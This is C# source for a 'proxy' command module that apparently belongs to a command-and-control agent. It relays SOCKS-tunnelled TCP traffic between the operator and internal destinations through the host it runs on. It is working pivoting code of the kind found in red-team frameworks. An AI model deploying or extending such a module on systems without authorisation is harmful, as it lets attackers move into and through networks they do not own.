using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Input;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;
using Agent.Models;
using System.Diagnostics;
using System.Net.Sockets;
using System.Net.NetworkInformation;

namespace Agent.Commands
{
    public static class TcpClientExtensions
    {
        public static bool DataAvailable(this TcpClient client)
        {
            var ns = client.GetStream();
            return ns.DataAvailable;
        }

        public static bool IsAlive(this TcpClient client)
        {
            IPGlobalProperties ipProperties = IPGlobalProperties.GetIPGlobalProperties();
            TcpConnectionInformation[] tcpConnections = ipProperties.GetActiveTcpConnections().Where(x => x.LocalEndPoint.Equals(client.Client.LocalEndPoint) && x.RemoteEndPoint.Equals(client.Client.RemoteEndPoint)).ToArray();
            if (tcpConnections != null && tcpConnections.Length > 0)
            {
                TcpState stateOfConnection = tcpConnections.First().State;
                if (stateOfConnection == TcpState.Established)
                {
                    return true;
                    // Connection is OK
                }
            }
            return false;
        }

        public static async Task<TcpClient> AcceptTcpClientAsync(this TcpListener listener, CancellationTokenSource cts)
        {
            using (cts.Token.Register(listener.Stop))
            {
                try
                {
                    var client = await listener.AcceptTcpClientAsync().ConfigureAwait(false);
                    return client;
                }
                catch (ObjectDisposedException ex)
                {
                    // Token was canceled - swallow the exception and return null
                    if (cts.Token.IsCancellationRequested) return null;
                    throw ex;
                }
            }
        }

        public static byte[] ReceivedData(this TcpClient client)
        {
            // Get the client's NetworkStream
            var stream = client.GetStream();

            // Check if data is available to be read
            if (stream.DataAvailable)
            {
                // Read data from the stream
                var buffer = new byte[1024];
                int bytesRead = stream.Read(buffer, 0, buffer.Length);

                // Return the data that was read
                var data = new byte[bytesRead];
                Array.Copy(buffer, 0, data, 0, bytesRead);
                return data;
            }
            else
            {
                // Return an empty array if no data is available
                return new byte[0];
            }
        }

        public static void SendData(this TcpClient client, byte[] data)
        {
            // Get the client's NetworkStream
            var stream = client.GetStream();

            // Write the data to the stream
            stream.Write(data, 0, data.Length);
        }
    }
    public class ProxyCommand : AgentCommand
    {
        object __lockObj = new object();
        private bool isRunning;
        public override string Name => "proxy";


        public override void InnerExecute(AgentTask task, AgentCommandContext context)
        {
            if (task.SplittedArgs.Length > 0 && task.SplittedArgs[0] == "stop")
            {
                lock (__lockObj)
                {
                    if (isRunning)
                    {
                        isRunning = false;
                    }
                    else
                    {
                        context.Result.Result = "Proxy is not running!";
                    }
                }
                return;
            }

            lock (__lockObj)
            {
                if (isRunning)
                {
                    context.Result.Result = "Proxy is already running!";
                    return;
                }
                else
                    isRunning = true;
            }


            Dictionary<string, TcpClient> Clients = new Dictionary<string, TcpClient>();

            while (true)
            {
                lock (__lockObj)
                {
                    if (!isRunning)
                        break;
                }
                Thread.Sleep(5);

                SocksMessage received = null;
                while ((received = context.ProxyService.DequeueRequest()) != null)
                {
                    //Console.WriteLine($"received message from proxy : {received.Source}");
                    string id = received.Source;


                    //connection or disconneciont
                    if (received.Data == null)
                    {
                        //connexion
                        if (received.ConnexionState)
                        {
                            Console.WriteLine($"New connection : {id}");
                            var destination = new TcpClient();
                            var destAddres = id.Split('|')[1];

                            if (!destination.ConnectAsync(destAddres.Split(':')[0], int.Parse(destAddres.Split(':')[1])).Wait(500))
                            {
                                context.ProxyService.EnqueueResponse(new SocksMessage()
                                {
                                    Source = id,
                                    ConnexionState = false,
                                });
                                Debug.WriteLine($"Connexion refused {id}");
                            }
                            else
                            {
                                if (!Clients.ContainsKey(id))
                                    Clients.Add(id, destination);
                                else
                                    Clients[id] = destination;

                                context.ProxyService.EnqueueResponse(new SocksMessage()
                                {
                                    Source = id,
                                    ConnexionState = true,
                                });

                                Debug.WriteLine($"Connexion accepted {id}");
                            }
                        }
                        else
                        //disconnection
                        {
                            Debug.WriteLine($"Connexion closed {id} (from source)");
                            if (Clients.ContainsKey(id))
                            {
                                var dest = Clients[id];
                                Clients.Remove(id);
                                dest.Close();
                            }

                        }
                    }

                    //data to send
                    if (!string.IsNullOrEmpty(received.Data))
                    {

                        if (!Clients.ContainsKey(id))
                        {
                            Debug.WriteLine($"Data received but no client with id {id}");
                            continue;
                        }
                        var dest = Clients[id];
                        var data = Convert.FromBase64String(received.Data);
                        dest.SendData(data);
                        Debug.WriteLine($"Data sent to {id} ({data.Length})");
                    }

                }

                //Get clients responses and send them
                foreach (var id in Clients.Keys)
                {
                    var dest = Clients[id];
                    if (dest.IsAlive() && dest.DataAvailable())
                    {
                        var data = dest.ReceivedData();
                        context.ProxyService.EnqueueResponse(new SocksMessage()
                        {
                            Source = id,
                            Data = Convert.ToBase64String(data),
                            ConnexionState = true,
                        });
                        Debug.WriteLine($"Data received from {id} ({data.Length})");
                    }
                }

                //Cleanup closed clients
                List<string> toRemove = new List<string>();
                foreach (var id in Clients.Keys)
                {
                    var dest = Clients[id];
                    if (!dest.IsAlive())
                    {
                        toRemove.Add(id);
                        context.ProxyService.EnqueueResponse(new SocksMessage()
                        {
                            Source = id,
                            ConnexionState = false,
                        });
                        Debug.WriteLine($"Connexion closed {id} (from dest)");
                    }
                }
                foreach (var id in toRemove)
                    Clients.Remove(id);

            }
        }
    }
}
